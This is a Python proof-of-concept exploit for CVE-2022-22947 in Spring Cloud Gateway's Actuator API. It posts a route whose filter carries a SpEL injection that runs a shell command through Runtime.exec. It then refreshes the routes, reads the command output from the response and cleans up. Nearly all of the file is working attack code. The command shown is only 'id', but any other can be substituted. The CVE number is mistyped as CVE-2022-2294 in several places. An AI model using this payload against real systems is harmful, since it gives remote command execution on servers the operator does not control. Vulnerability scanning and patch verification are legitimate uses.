#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/13 21:20
# Author     : yunkong
# FileName   : cve_2022_22947_poc.py
# Description:
#
# Exploit Title: Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）
# Version: (3.1.x)< 3.1.1; (3.0.x)< 3.0.7; 其他已不再更新的版本
# CVE: CVE-2022-2294
import json

import requests

headers1 = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/json'
}

headers2 = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

data_payload = '''{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\\"id\\").getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}'''
proxy = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}


def check_cve_2022_22947(target_url):
    try:
        re1 = requests.post(url=target_url + "/actuator/gateway/routes/hacktest", data=data_payload, headers=headers1,
                            # proxies=proxy,
                            json=json,
                            timeout=10)
        if re1.status_code != 201:
            print(f"[-] Target: {target_url} CVE-2022-2294 may not exist!")
            return False
        requests.post(url=target_url + "/actuator/gateway/refresh", headers=headers2)
        re3 = requests.get(url=target_url + "/actuator/gateway/routes/hacktest", headers=headers2)
        if re3.status_code != 200:
            print(f"[-] Target: {target_url} CVE-2022-2294 may not exist!")
            return False
        else:
            requests.delete(url=target_url + "/actuator/gateway/routes/hacktest", headers=headers2)
            requests.post(url=target_url + "/actuator/gateway/refresh", headers=headers2)
            if "uid=" in re3.text:
                print(f"[+] Target: {target_url} CVE-2022-2294 may exist!!!")
                return True
    except:
        print(f"[-] The request to the {target_url} website has timed out!")


def vuln_scan_start(target_url):
    check_cve_2022_22947(target_url)


# vuln_scan_start("http://192.168.12.130:8080")
